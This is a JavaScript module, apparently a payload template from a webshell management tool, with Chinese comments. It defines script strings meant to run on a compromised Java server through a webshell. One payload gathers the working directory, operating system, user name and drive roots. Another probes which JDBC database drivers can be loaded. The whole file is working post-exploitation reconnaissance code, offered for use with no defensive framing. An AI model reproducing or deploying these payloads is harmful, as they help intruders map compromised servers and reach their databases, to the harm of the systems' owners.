/**
 * 基础信息模板
 * ? 获取系统信息、当前用户、当前路径、盘符列表
 */

module.exports = () => ({
  info: {
    _: `function SysInfoCode() {
      var d = System.getProperty("user.dir");
      var serverInfo = System.getProperty("os.name");
      var user = System.getProperty("user.name");
      var driverlist = WwwRootPathCode(d);
      return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
    }
    
    function WwwRootPathCode(d) {
      var s = "";
      if (!d.substring(0, 1).equals("/")) {
        var roots = java.io.File.listRoots();
        for (var i = 0; i < roots.length; i++) {
          s += roots[i].toString().substring(0, 2) + "";
        }
      } else {
        s += "/";
      }
      return s;
    }
    output.append(SysInfoCode());
    `.replace(/\n\s+/g, '')
  },
  probedb: { // 检测数据库函数支持
    _: `
    function ProbedbCode() {
      var drivers = [
        "com.mysql.jdbc.Driver",
        "com.mysql.cj.jdbc.Driver",
        "oracle.jdbc.driver.OracleDriver",
        "org.postgresql.Driver",
        "weblogic.jdbc.mssqlserver4.Driver",
        "com.microsoft.sqlserver.jdbc.SQLServerDriver",
        "com.inet.pool.PoolDriver",
      ];
      var ret = "";
      for (var i = 0; i < drivers.length; i++) {
        try {
          Class.forName(drivers[i]);
          ret += drivers[i] + "\\t1\\n";
        } catch (e) {
          ret += drivers[i] + "\\t0\\n";
        }
      }
      return ret;
    }
    output.append(ProbedbCode());
    `.replace(/\n\s+/g, '')
  }
})